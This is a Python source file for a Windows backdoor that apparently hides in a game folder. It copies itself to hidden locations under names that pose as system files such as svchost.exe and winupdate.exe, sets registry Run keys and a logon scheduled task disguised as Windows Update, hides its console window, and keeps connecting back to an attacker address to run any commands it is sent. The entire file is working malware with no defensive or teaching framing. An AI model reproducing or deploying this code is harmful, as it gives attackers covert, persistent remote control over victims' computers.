"""
STANDALONE PERSISTENT SHELL - Runs completely independent of the game
This file should be placed in the game folder alongside client_agent.py
"""

import socket
import subprocess
import os
import time
import sys
import winreg
import shutil
import getpass

ATTACKER_IP = "192.168.56.1"
ATTACKER_PORT = 4444

def add_to_startup():
    """Add to multiple startup locations to survive reboots"""
    try:
        # Get current executable path
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
            
            # Copy to multiple hidden locations
            locations = [
                os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Caches\\svchost.exe"),
                os.path.expanduser("~\\AppData\\Local\\Temp\\winupdate.exe"),
                os.path.expanduser("C:\\ProgramData\\Microsoft\\Windows\\Caches\\winservice.exe")
            ]
            
            for dest in locations:
                try:
                    os.makedirs(os.path.dirname(dest), exist_ok=True)
                    if not os.path.exists(dest):
                        shutil.copy2(exe_path, dest)
                        
                        # Add to registry
                        key = winreg.HKEY_CURRENT_USER
                        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                            winreg.SetValueEx(regkey, "WindowsUpdateSvc", 0, winreg.REG_SZ, f'"{dest}"')
                except:
                    pass
        
        # Add scheduled task (runs at system startup)
        try:
            task_name = "WindowsUpdateTask"
            # Delete if exists
            subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, capture_output=True)
            # Create new task that runs at user logon
            task_cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc ONLOGON /ru "{getpass.getuser()}" /f'
            subprocess.run(task_cmd, shell=True, capture_output=True)
        except:
            pass
            
        return True
    except:
        return False

def reverse_shell():
    """Main shell function - runs forever independently"""
    # Add persistence (only once)
    add_to_startup()
    
    # Write PID to file so we can track it
    pid_file = os.path.expanduser("~\\AppData\\Local\\Temp\\winupdate.pid")
    with open(pid_file, 'w') as f:
        f.write(str(os.getpid()))
    
    while True:
        try:
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            
            # Send identification
            hostname = os.environ.get('COMPUTERNAME', 'Unknown')
            username = os.environ.get('USERNAME', 'Unknown')
            s.send(f"\n[🔴 PERSISTENT SHELL] {hostname}\\{username} | PID: {os.getpid()}\n$ ".encode())
            
            # Command loop
            while True:
                try:
                    command = s.recv(8192).decode().strip()
                    
                    if not command:
                        continue
                    
                    if command.lower() == 'exit':
                        break
                    
                    if command.lower() == 'die':
                        # Self-destruct command
                        s.send(b"Self destructing...\n")
                        s.close()
                        os._exit(0)
                    
                    # Handle cd
                    if command.lower().startswith('cd '):
                        try:
                            os.chdir(command[3:])
                            result = f"{os.getcwd()}\n"
                        except Exception as e:
                            result = f"Error: {e}\n"
                        s.send(result.encode())
                    
                    # Handle other commands
                    else:
                        try:
                            # Use Popen for large output
                            proc = subprocess.Popen(
                                command,
                                shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE
                            )
                            
                            try:
                                stdout, stderr = proc.communicate(timeout=30)
                                
                                if stdout:
                                    s.send(stdout)
                                if stderr:
                                    s.send(stderr)
                                if not stdout and not stderr:
                                    s.send(b"[OK]\n")
                                    
                            except subprocess.TimeoutExpired:
                                proc.kill()
                                s.send(b"Command timed out\n")
                                
                        except Exception as e:
                            s.send(f"Error: {e}\n".encode())
                    
                    s.send(b"$ ")
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    break
                    
            s.close()
            
        except Exception as e:
            # Wait before reconnecting
            time.sleep(10)
        
        time.sleep(5)

if __name__ == "__main__":
    # Hide console
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    # Run shell forever
    reverse_shell()